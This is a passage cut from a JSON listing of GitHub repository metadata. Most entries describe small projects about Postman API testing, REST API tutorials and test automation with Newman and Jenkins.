front-end.","fork":false,"created_at":"2019-06-07T09:01:10Z","updated_at":"2019-07-31T07:53:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45259330,"owner_login":"SeepG","owner_avatar_url":"https://avatars3.githubusercontent.com/u/45259330?v=4","pulled":1,"tags":["test","testing","script","built","front","been"]},{"id":238195152,"name":"web-service","full_name":"elevliaykut/web-service","description":"A Simple REST API application that web service using Node.js and MongoDB. You may test use with amazing tool Postman.","fork":false,"created_at":"2020-02-04T11:58:26Z","updated_at":"2020-02-20T20:35:12Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":29731054,"owner_login":"elevliaykut","owner_avatar_url":"https://avatars3.githubusercontent.com/u/29731054?v=4","pulled":1,"tags":["test","application","service","tool","amazing"]},{"id":231284840,"name":"FSJS-Project-Nine","full_name":"Zandy12/FSJS-Project-Nine","description":"Ninth project of the Full Stack JavaScript techdegree program offered by www.teamtreehouse.com. The project involves building a REST API using Node.js and testing with Postman.","fork":false,"created_at":"2020-01-02T01:18:48Z","updated_at":"2020-01-08T00:20:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35899477,"owner_login":"Zandy12","owner_avatar_url":"https://avatars1.githubusercontent.com/u/35899477?v=4","pulled":1,"tags":["test","testing","build","program","tech","building","offered","degree","involves"]},{"id":134885496,"name":"SpringBoot-Derby","full_name":"ravi-nrk/SpringBoot-Derby","description":"created simple SpringBoot Application with CRUD operations and used embedded database which is Derby. Used Postman to test REST Api's","fork":false,"created_at":"2018-05-25T17:23:08Z","updated_at":"2018-05-25T17:41:55Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":29214542,"owner_login":"ravi-nrk","owner_avatar_url":"https://avatars3.githubusercontent.com/u/29214542?v=4","pulled":1,"tags":["test","create","data","database","operation","operations","embedded"]},{"id":104587490,"name":"webservices-test-framework-compare","full_name":"FachrulCH/webservices-test-framework-compare","description":"personal opinion for test framework for web services in PHP, Python, Javascript, and Java. using codeception, postman-newman, robot framework, rest assured","fork":false,"created_at":"2017-09-23T17:52:06Z","updated_at":"2017-09-23T17:56:28Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10245158,"owner_login":"FachrulCH","owner_avatar_url":"https://avatars0.githubusercontent.com/u/10245158?v=4","pulled":1,"tags":["test"," postman","rest","script","service","code","newman","framework","services","robo","personal","assured","codeception","opinion"]},{"id":250102289,"name":"ProjetoSpring","full_name":"daise18/ProjetoSpring","description":"Projeto java com spring boot, spring jpa, utilizando conceitos de microsserviços/apis, banco de dados, json, anotação, repository, entity, rest controllers, testes manuais via postman., ","fork":false,"created_at":"2020-03-25T22:08:08Z","updated_at":"2020-03-25T22:12:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":62191842,"owner_login":"daise18","owner_avatar_url":"https://avatars3.githubusercontent.com/u/62191842?v=4","pulled":1,"tags":["test"," postman","repo","repos","repository","rest","json","util","java","boot","spring","control","micro","utilizando","testes","spring boot","controller","entity","dados","banco","manua","conceitos"]},{"id":86376672,"name":"spring-restful-web-services-crud-example","full_name":"ddemott/spring-restful-web-services-crud-example","description":"DESCRIPTION:  This project represents a base Spring 4 legacy project for Spring MVC / REST services.  The REST services are handled / tested by index.html.  This is done so you can see an example of how to call all of the CRUD  functions from a web page.  Most projects do not make the calls from a web page but from POSTMAN or even from a  test function which does you no good if you are trying to figure out how to do call from a webpage.  Dependencies ------------ Maven 3.1 Java 8 Spring 4 Spring MVC 4 Jackson Databind javax.servlet-api 3.1","fork":false,"created_at":"2017-03-27T19:40:04Z","updated_at":"2018-05-25T21:05:04Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":6421193,"owner_login":"ddemott","owner_avatar_url":"https://avatars2.githubusercontent.com/u/6421193?v=4","pulled":1,"tags":["test","service","call","example","tested","function","calls","services","java","html","to do","handle","functions","done","projects","trying"]},{"id":129877594,"name":"mfpAdapterTester","full_name":"IbrahimMSabek/mfpAdapterTester","description":"This will be a web app that will act like Postman which aim to test secured IBM Mobilefirst 8 adapters with custom authentication specially that save and use data within active session as Postman basic authentication debugging detailed in MFP docs won't fit","fork":false,"created_at":"2018-04-17T09:10:07Z","updated_at":"2018-10-01T07:38:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":38443984,"owner_login":"IbrahimMSabek","owner_avatar_url":"https://avatars2.githubusercontent.com/u/38443984?v=4","pulled":1,"tags":["test","data","auth","spec","authentication","web app","custom","docs","within","debug","debugging","secure","secured"]},{"id":128530193,"name":"springboot-testing-mysql","full_name":"ivangfr/springboot-testing-mysql","description":"The goals of this project are: 1) Create a simple Spring Boot REST API to manage users called user-service. The database used is MySQL; 2) Explore the utilities and annotations that Spring Boot provides when testing applications. 3) Testing with Postman and Newman","fork":false,"created_at":"2018-04-07T13:20:13Z","updated_at":"2020-03-28T11:27:06Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":10564548,"owner_login":"ivangfr","owner_avatar_url":"https://avatars3.githubusercontent.com/u/10564548?v=4","pulled":1,"tags":["test","data","testing","application","service","call","database","user","util","manage","users","provide","applications","provides","utilities","goal","notation","goals"]},{"id":169711642,"name":"Todo-Api","full_name":"sahilwasan000/Todo-Api","description":"A REST API that lets the user, use the end points and create his own application using the API. It uses Node.js, Express and MongoDB for development and Mocha and Postman for testing purposes.","fork":false,"created_at":"2019-02-08T09:32:10Z","updated_at":"2019-04-07T15:56:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32892440,"owner_login":"sahilwasan000","owner_avatar_url":"https://avatars2.githubusercontent.com/u/32892440?v=4","pulled":1,"tags":["test","create","testing","application","user","develop","points","development","uses","purposes","lets"]},{"id":150223648,"name":"Crypto_APIs","full_name":"Harshrajsinh96/Crypto_APIs","description":"Created REST APIs for a blockchain crypto-currency where Wallet and Transactions entities were handled using SQLAlchemy mapper in Flask framework and the data was persisted in SQLite DB. Whole setup with GET/POST/DELETE request was tested on Postman.","fork":false,"created_at":"2018-09-25T07:20:06Z","updated_at":"2018-09-27T00:31:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":31783541,"owner_login":"Harshrajsinh96","owner_avatar_url":"https://avatars3.githubusercontent.com/u/31783541?v=4","pulled":1,"tags":["test","data","request","tested","framework","action","chai","currency","handle","were","setup","crypto","blockchain"]},{"id":228106619,"name":"Spring-Boot","full_name":"rochaskingdom/Spring-Boot","description":"Construção API REST Completa - JPA, Bean Validation, Spring Cache, Spring Security, Token/Autenticação com JWT, Monitoramento com Spring Boot Actuator, Spring Boot Admin/Client, Documentação da API com Swagger. Ambiente de testes Postman.","fork":false,"created_at":"2019-12-15T00:08:33Z","updated_at":"2019-12-23T14:53:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44781974,"owner_login":"rochaskingdom","owner_avatar_url":"https://avatars1.githubusercontent.com/u/44781974?v=4","pulled":1,"tags":["test","testes"]},{"id":135631271,"name":"CloudAPI","full_name":"Tiausa/CloudAPI","description":"Implemented REST API that supported user account using 3rd party providers and account specific information. Used non-relational database to support related entities. Created full test suite using Postman. ","fork":false,"created_at":"2018-05-31T20:18:11Z","updated_at":"2018-05-31T20:26:14Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11865853,"owner_login":"Tiausa","owner_avatar_url":"https://avatars1.githubusercontent.com/u/11865853?v=4","pulled":1,"tags":["test","data","form","database","user","format","spec","full","provide","info","infor","information","support","specific","account","related","party","suite","test suite","supported","provider"]},{"id":115544571,"name":"todolist_using_api_and_ajax","full_name":"danielxcom/todolist_using_api_and_ajax","description":"Test-run of ajax syntax, todolist using RESTful web services tested with POSTMAN. Refactored REST operations in Promises + put them in helper file to make modular todos.js. Schema created using MongoDB","fork":false,"created_at":"2017-12-27T17:48:23Z","updated_at":"2017-12-27T17:51:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26654775,"owner_login":"danielxcom","owner_avatar_url":"https://avatars0.githubusercontent.com/u/26654775?v=4","pulled":1,"tags":["test","create","file","service","tested","help","operation","services","list","operations","todo","actor","helper","syntax","ajax"]},{"id":123554860,"name":"MongoDBTutorial","full_name":"JohnArg/MongoDBTutorial","description":"(Learning Project) The code from a course while learning MongoDB with Node/Express. The result is the creation of a simple REST API using Mongoose and Postman for testing. Mocha, Expect and Supertest were also used for assertions.","fork":false,"created_at":"2018-03-02T08:50:29Z","updated_at":"2018-11-01T11:53:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":8913266,"owner_login":"JohnArg","owner_avatar_url":"https://avatars0.githubusercontent.com/u/8913266?v=4","pulled":1,"tags":["test","testing","code","learn","course","learning","result","were","creation","assert","while","assertion"]},{"id":235235695,"name":"booking","full_name":"tomashchuk/booking","description":"REST API Booking Database with JWT authorization (using Bearer). Registration - https://bookingstest.herokuapp.com/auth/register/. Login - https://bookingstest.herokuapp.com/auth/login/ Root api: https://bookingstest.herokuapp.com/api/. Recommended to use Postman for testing purposes.","fork":false,"created_at":"2020-01-21T01:58:08Z","updated_at":"2020-01-21T03:03:14Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":58090105,"owner_login":"tomashchuk","owner_avatar_url":"https://avatars2.githubusercontent.com/u/58090105?v=4","pulled":1,"tags":["test","testing","http","auth","https","book","login","purposes","heroku","register","authorization","booking"]},{"id":178220194,"name":"Explorer-Ionic","full_name":"dailiang18bb/Explorer-Ionic","description":"Explorer – A hybrid mobile apps which help explore the world by using Google Vision and Wikipedia API. Coding in Angular 6, building with Ionic 4 and Cordova. Worked on the REST/Web API to create the services and tested on postman and used in AngularJS $HTTP service calls and bind the data in the card.","fork":false,"created_at":"2019-03-28T14:27:29Z","updated_at":"2020-02-19T21:15:41Z","stargazers_count":1,"watchers_count":1,"forks":1,"watchers":1,"score":1,"owner_id":15603436,"owner_login":"dailiang18bb","owner_avatar_url":"https://avatars0.githubusercontent.com/u/15603436?v=4","pulled":1,"tags":["test"," postman","create","data","service","call","tested","help","build","calls","services","building","mobile","world","explore","apps","hybrid"]},{"id":205943793,"name":"admin-service-api","full_name":"anandjat05/admin-service-api","description":"Project based on Micro-services, I created REST API's, wrote Junit, testing the coverage, bug smell, vulnerability analysis on Sonarqube and static test analysis using Jococo, Jenkins, Postman and Newman deploy through the CI/CD pipeline in ECS cluster using EC2 instances, Dockerhub, Docker Container/image. ","fork":false,"created_at":"2019-09-02T22:10:35Z","updated_at":"2019-11-04T22:01:23Z","stargazers_count":1,"watchers_count":1,"forks":1,"watchers":1,"score":1,"owner_id":39242031,"owner_login":"anandjat05","owner_avatar_url":"https://avatars3.githubusercontent.com/u/39242031?v=4","pulled":1,"tags":["test","create","testing","service","based","line","services","stat","image","unit","pipeline","coverage","instance","vulnerability","instances"]},{"id":217480978,"name":"DemoHtCm","full_name":"jmaribau/DemoHtCm","description":"Simple Api Rest Crud with Docker, Symfony 4.3, Mysql 5.7, PhpUnit, Unit Integration Functional tests, Data fixtures, 95% Coverage,  Authentication JWT, Events, EventsSubscribers, Loggin, Authorization Roles, Services, Managers, Composer, MakeFile Commands, PostMan collections & environment, checked with quality tools, SOLID,  clean code, best practices.","fork":false,"created_at":"2019-10-25T07:51:33Z","updated_at":"2019-11-04T11:00:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":13312343,"owner_login":"jmaribau","owner_avatar_url":"https://avatars0.githubusercontent.com/u/13312343?v=4","pulled":1,"tags":["test","collect","collection","collections","tests","tool","code","environment","tools","check","practice","best","quality","checked","clean","practices","fixtures"]},{"id":189053477,"name":"postmanTest","full_name":"skoufandri/postmanTest","description":"test postman","fork":false,"created_at":"2019-05-28T15:18:07Z","updated_at":"2019-05-28T15:18:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":51122693,"owner_login":"skoufandri","owner_avatar_url":"https://avatars3.githubusercontent.com/u/51122693?v=4","pulled":1,"tags":["test"," postman"]},{"id":220678451,"name":"PostmanTest","full_name":"Sdlearning/PostmanTest","description":"Postman test","fork":false,"created_at":"2019-11-09T17:31:22Z","updated_at":"2019-11-12T16:15:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":37023503,"owner_login":"Sdlearning","owner_avatar_url":"https://avatars1.githubusercontent.com/u/37023503?v=4","pulled":1,"tags":["test"]},{"id":162421127,"name":"postman","full_name":"BravoTeam2018/postman","description":"Postman tests used to test DetectCloneRFID","fork":false,"created_at":"2018-12-19T10:25:20Z","updated_at":"2018-12-19T10:53:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45466916,"owner_login":"BravoTeam2018","owner_avatar_url":"https://avatars0.githubusercontent.com/u/45466916?v=4","pulled":1,"tags":["test","tests","tests "]},{"id":93076217,"name":"test","full_name":"aBobotsov/test","description":"for Postman tests","fork":false,"created_at":"2017-06-01T16:13:17Z","updated_at":"2017-06-01T16:13:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25867238,"owner_login":"aBobotsov","owner_avatar_url":"https://avatars0.githubusercontent.com/u/25867238?v=4","pulled":1,"tags":["test","tests"]},{"id":169877936,"name":"test","full_name":"Ladylittleleaf/test","description":"test for postman","fork":false,"created_at":"2019-02-09T14:58:41Z","updated_at":"2019-02-10T10:16:11Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42837918,"owner_login":"Ladylittleleaf","owner_avatar_url":"https://avatars1.githubusercontent.com/u/42837918?v=4","pulled":1,"tags":["test"," postman"]},{"id":144594204,"name":"PostmanIntegration","full_name":"jdlawren/PostmanIntegration","description":"testing postman integration","fork":false,"created_at":"2018-08-13T14:51:40Z","updated_at":"2018-08-13T14:53:11Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":13338267,"owner_login":"jdlawren","owner_avatar_url":"https://avatars1.githubusercontent.com/u/13338267?v=4","pulled":1,"tags":["test"," postman","testing","integration"]},{"id":237379842,"name":"httpbin_postman-tests","full_name":"Stone1Lin/httpbin_postman-tests","description":"postman_test","fork":false,"created_at":"2020-01-31T07:19:48Z","updated_at":"2020-01-31T07:25:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":23294718,"owner_login":"Stone1Lin","owner_avatar_url":"https://avatars0.githubusercontent.com/u/23294718?v=4","pulled":1,"tags":["test"]},{"id":193132911,"name":"postman","full_name":"Derevyaa/postman","description":"salesforce tests for accounts","fork":false,"created_at":"2019-06-21T16:55:49Z","updated_at":"2019-06-27T14:28:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":23738372,"owner_login":"Derevyaa","owner_avatar_url":"https://avatars2.githubusercontent.com/u/23738372?v=4","pulled":1,"tags":["test","tests","tests ","account","accounts","salesforce"]},{"id":215287087,"name":"postman-test","full_name":"vishaldot/postman-test","description":"postman testing ","fork":false,"created_at":"2019-10-15T11:56:49Z","updated_at":"2019-10-16T11:22:32Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":54182868,"owner_login":"vishaldot","owner_avatar_url":"https://avatars2.githubusercontent.com/u/54182868?v=4","pulled":1,"tags":["test","testing"]},{"id":219665961,"name":"postmantests","full_name":"AlainGhawi/postmantests","description":"Postman tests","fork":false,"created_at":"2019-11-05T05:39:06Z","updated_at":"2019-11-05T09:00:13Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25838998,"owner_login":"AlainGhawi","owner_avatar_url":"https://avatars3.githubusercontent.com/u/25838998?v=4","pulled":1,"tags":["test","tests"]},{"id":117916851,"name":"postman-tests","full_name":"kpkiran/postman-tests","description":"postman tests","fork":false,"created_at":"2018-01-18T01:51:07Z","updated_at":"2018-11-12T07:47:14Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16494789,"owner_login":"kpkiran","owner_avatar_url":"https://avatars1.githubusercontent.com/u/16494789?v=4","pulled":1,"tags":["test","tests","postman tests"]},{"id":178275089,"name":"postman-tests","full_name":"alonsodiego/postman-tests","description":"postman-tests","fork":false,"created_at":"2019-03-28T20:12:08Z","updated_at":"2019-03-29T15:04:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1088174,"owner_login":"alonsodiego","owner_avatar_url":"https://avatars2.githubusercontent.com/u/1088174?v=4","pulled":1,"tags":["test","tests"]},{"id":238525562,"name":"testing","full_name":"frankgmz123/testing","description":"testing postman","fork":false,"created_at":"2020-02-05T18:59:25Z","updated_at":"2020-02-05T18:59:25Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57681117,"owner_login":"frankgmz123","owner_avatar_url":"https://avatars3.githubusercontent.com/u/57681117?v=4","pulled":1,"tags":["test"," postman","testing"]},{"id":167029194,"name":"PostmanTests","full_name":"DavidChezem/PostmanTests","description":"Samples of using JAVA based tests in Postman","fork":false,"created_at":"2019-01-22T16:39:10Z","updated_at":"2019-01-22T16:39:10Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":46934107,"owner_login":"DavidChezem","owner_avatar_url":"https://avatars1.githubusercontent.com/u/46934107?v=4","pulled":1,"tags":["test","tests","tests ","based"]},{"id":107155099,"name":"postmanTest","full_name":"akshay2604/postmanTest","description":null,"fork":false,"created_at":"2017-10-16T16:39:18Z","updated_at":"2017-10-16T16:39:18Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":20161828,"owner_login":"akshay2604","owner_avatar_url":"https://avatars0.githubusercontent.com/u/20161828?v=4","pulled":1,"tags":[]},{"id":212039924,"name":"PostmanTest","full_name":"AnastasiiaPishchela/PostmanTest","description":null,"fork":false,"created_at":"2019-10-01T07:47:08Z","updated_at":"2019-10-01T07:47:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":51374113,"owner_login":"AnastasiiaPishchela","owner_avatar_url":"https://avatars1.githubusercontent.com/u/51374113?v=4","pulled":1,"tags":[]},{"id":246319798,"name":"PostmanTest","full_name":"gcampbell391/PostmanTest","description":null,"fork":false,"created_at":"2020-03-10T14:15:47Z","updated_at":"2020-03-10T14:15:47Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44715436,"owner_login":"gcampbell391","owner_avatar_url":"https://avatars2.githubusercontent.com/u/44715436?v=4","pulled":1,"tags":[]},{"id":137879156,"name":"PostmanTests","full_name":"cacarott1130/PostmanTests","description":null,"fork":false,"created_at":"2018-06-19T10:56:07Z","updated_at":"2019-01-09T11:38:09Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25843991,"owner_login":"cacarott1130","owner_avatar_url":"https://avatars1.githubusercontent.com/u/25843991?v=4","pulled":1,"tags":[]},{"id":240963682,"name":"Postman","full_name":"smuggulla/Postman","description":"To test Repo from postman","fork":false,"created_at":"2020-02-16T20:49:49Z","updated_at":"2020-02-16T20:49:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":61124083,"owner_login":"smuggulla","owner_avatar_url":"https://avatars3.githubusercontent.com/u/61124083?v=4","pulled":1,"tags":["test"," postman"]},{"id":132346522,"name":"postmanTest","full_name":"piokrajewski/postmanTest","description":"Basic setup of automation test process with jenkins+newman+postman","fork":false,"created_at":"2018-05-06T14:32:04Z","updated_at":"2018-05-15T10:50:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26937424,"owner_login":"piokrajewski","owner_avatar_url":"https://avatars2.githubusercontent.com/u/26937424?v=4","pulled":1,"tags":["test","auto","automat","newman","automation","setup","process","jenkins"]},{"id":125899562,"name":"PostmanTest","full_name":"juantor16/PostmanTest","description":null,"fork":false,"created_at":"2018-03-19T18:01:15Z","updated_at":"2018-03-19T18:07:12Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10635675,"owner_login":"juantor16","owner_avatar_url":"https://avatars3.githubusercontent.com/u/10635675?v=4","pulled":1,"tags":[]},{"id":250383709,"name":"PostmanTests","full_name":"Chupa14142/PostmanTests","description":null,"fork":false,"created_at":"2020-03-26T22:15:45Z","updated_at":"2020-03-27T01:45:25Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42383706,"owner_login":"Chupa14142","owner_avatar_url":"https://avatars0.githubusercontent.com/u/42383706?v=4","pulled":1,"tags":[]},{"id":204883314,"name":"PostmanTest","full_name":"JoaquinGomezCabido/PostmanTest","description":null,"fork":false,"created_at":"2019-08-28T08:23:05Z","updated_at":"2019-08-28T08:23:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":52210795,"owner_login":"JoaquinGomezCabido","owner_avatar_url":"https://avatars1.githubusercontent.com/u/52210795?v=4","pulled":1,"tags":[]},{"id":133698405,"name":"testing_continues","full_name":"luisg18997/testing_continues","description":"practica de testing automatizado con postman, newman, jmeter y jenkins","fork":false,"created_at":"2018-05-16T17:00:39Z","updated_at":"2019-05-04T23:36:56Z","stargazers_count":2,"watchers_count":2,"forks":0,"watchers":2,"score":1,"owner_id":26290370,"owner_login":"luisg18997","owner_avatar_url":"https://avatars3.githubusercontent.com/u/26290370?v=4","pulled":1,"tags":["test"," postman","testing","auto","automat","newman","jenkins","jmeter","automatizado","practica"]},{"id":78614306,"name":"PostmanTest","full_name":"kiranwilson/PostmanTest","description":null,"fork":false,"created_at":"2017-01-11T07:35:37Z","updated_at":"2017-01-11T07:35:37Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25051117,"owner_login":"kiranwilson","owner_avatar_url":"https://avatars1.githubusercontent.com/u/25051117?v=4","pulled":1,"tags":[]},{"id":87941001,"name":"postmanTest","full_name":"gkielar/postmanTest","description":null,"fork":false,"created_at":"2017-04-11T14:02:09Z","updated_at":"2018-03-27T14:19:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":27288223,"owner_login":"gkielar","owner_avatar_url":"https://avatars2.githubusercontent.com/u/27288223?v=4","pulled":1,"tags":[]},{"id":116050891,"name":"PostmanTest","full_name":"Mohsen3p200/PostmanTest","description":null,"fork":false,"created_at":"2018-01-02T19:45:51Z","updated_at":"2018-01-02T19:45:51Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26491836,"owner_login":"Mohsen3p200","owner_avatar_url":"https://avatars2.githubusercontent.com/u/26491836?v=4","pulled":1,"tags":[]},{"id":239682309,"name":"PostmanTests","full_name":"santhiparambalam/PostmanTests","description":null,"fork":false,"created_at":"2020-02-11T05:17:02Z","updated_at":"2020-02-11T08:32:09Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45686927,"owner_login":"santhiparambalam","owner_avatar_url":"https://avatars1.githubusercontent.com/u/45686927?v=4","pulled":1,"tags":[]},{"id":141481909,"name":"PostmanAutomation","full_name":"shanthalarb/PostmanAutomation","description":"This repository has postman automation tests ","fork":false,"created_at":"2018-07-18T19:39:01Z","updated_at":"2018-07-18T19:40:40Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":41392923,"owner_login":"shanthalarb","owner_avatar_url":"https://avatars2.githubusercontent.com/u/41392923?v=4","pulled":1,"tags":["test"," postman","repo","repos","repository","tests","tests ","auto","automat","automation"]},{"id":222520099,"name":"testepostman","full_name":"BrunoNogAndrade/testepostman","description":"teste postman","fork":false,"created_at":"2019-11-18T18:48:20Z","updated_at":"2019-11-18T18:48:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":29817238,"owner_login":"BrunoNogAndrade","owner_avatar_url":"https://avatars2.githubusercontent.com/u/29817238?v=4","pulled":1,"tags":["test"," postman"]},{"id":230937226,"name":"POSTMAN","full_name":"Chukkyoj/POSTMAN","description":"Where i store all  my postman tests","fork":false,"created_at":"2019-12-30T15:20:53Z","updated_at":"2019-12-30T15:20:53Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":59366157,"owner_login":"Chukkyoj","owner_avatar_url":"https://avatars0.githubusercontent.com/u/59366157?v=4","pulled":1,"tags":["test"," postman","tests","store","postman tests"]},{"id":215520820,"name":"PostmanTestPublicRepo","full_name":"paavanpreet/PostmanTestPublicRepo","description":null,"fork":false,"created_at":"2019-10-16T10:27:30Z","updated_at":"2019-10-16T11:44:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45817100,"owner_login":"paavanpreet","owner_avatar_url":"https://avatars3.githubusercontent.com/u/45817100?v=4","pulled":1,"tags":[]},{"id":217514376,"name":"postmandocker","full_name":"CybageLakshya/postmandocker","description":"test project","fork":false,"created_at":"2019-10-25T10:57:32Z","updated_at":"2019-10-25T11:03:05Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44090652,"owner_login":"CybageLakshya","owner_avatar_url":"https://avatars3.githubusercontent.com/u/44090652?v=4","pulled":1,"tags":["test"]},{"id":208415348,"name":"PostmanRepo","full_name":"shreyaps/PostmanRepo","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-09-14T09:04:08Z","updated_at":"2019-09-14T09:04:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30948390,"owner_login":"shreyaps","owner_avatar_url":"https://avatars2.githubusercontent.com/u/30948390?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":146972115,"name":"postmanTestcaseGenerator","full_name":"uchat/postmanTestcaseGenerator","description":"Generate Postman test cases from JSON","fork":false,"created_at":"2018-09-01T05:56:13Z","updated_at":"2018-09-01T05:59:51Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":6498672,"owner_login":"uchat","owner_avatar_url":"https://avatars2.githubusercontent.com/u/6498672?v=4","pulled":1,"tags":["test","case","cases"]},{"id":233936696,"name":"PostmanNotes","full_name":"rajivpaulsingh/PostmanNotes","description":"This is a test repository created by Postman","fork":false,"created_at":"2020-01-14T21:11:33Z","updated_at":"2020-01-16T23:22:26Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7916287,"owner_login":"rajivpaulsingh","owner_avatar_url":"https://avatars2.githubusercontent.com/u/7916287?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":144596287,"name":"PostmanTest2","full_name":"jdlawren/PostmanTest2","description":null,"fork":false,"created_at":"2018-08-13T15:07:41Z","updated_at":"2018-08-13T15:08:26Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":13338267,"owner_login":"jdlawren","owner_avatar_url":"https://avatars1.githubusercontent.com/u/13338267?v=4","pulled":1,"tags":[]},{"id":212698113,"name":"PostmanTestsDemo","full_name":"crowcoder/PostmanTestsDemo","description":null,"fork":false,"created_at":"2019-10-03T23:12:14Z","updated_at":"2019-10-04T00:51:13Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":4210624,"owner_login":"crowcoder","owner_avatar_url":"https://avatars2.githubusercontent.com/u/4210624?v=4","pulled":1,"tags":[]},{"id":242259179,"name":"Hello-Postman2","full_name":"PaulinaCoding/Hello-Postman2","description":"This is your Postman test repository","fork":false,"created_at":"2020-02-22T01:15:03Z","updated_at":"2020-02-22T01:15:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":37420244,"owner_login":"PaulinaCoding","owner_avatar_url":"https://avatars0.githubusercontent.com/u/37420244?v=4","pulled":1,"tags":["test","repo","repos","repository"]},{"id":221031251,"name":"PostmanTest_example","full_name":"Eka-2019/PostmanTest_example","description":"some example simple tests in postman + fake server and basic authorization","fork":false,"created_at":"2019-11-11T17:12:12Z","updated_at":"2019-11-11T17:29:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":49332402,"owner_login":"Eka-2019","owner_avatar_url":"https://avatars2.githubusercontent.com/u/49332402?v=4","pulled":1,"tags":["test"," postman","tests","server","tests ","example","auth","fake","authorization"]},{"id":59610957,"name":"postman-test1","full_name":"witekcc/postman-test1","description":"integration testing with postman","fork":false,"created_at":"2016-05-24T21:47:37Z","updated_at":"2016-05-24T21:47:37Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10201184,"owner_login":"witekcc","owner_avatar_url":"https://avatars1.githubusercontent.com/u/10201184?v=4","pulled":1,"tags":["test"," postman","testing","integration"]},{"id":124874310,"name":"postmanrepo","full_name":"PaliwalArpit/postmanrepo","description":"simple postman test","fork":false,"created_at":"2018-03-12T10:46:41Z","updated_at":"2018-03-12T10:46:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":24191878,"owner_login":"PaliwalArpit","owner_avatar_url":"https://avatars0.githubusercontent.com/u/24191878?v=4","pulled":1,"tags":["test"," postman"]},{"id":134369547,"name":"postmanrepo","full_name":"sureshkodamala/postmanrepo","description":"This is test 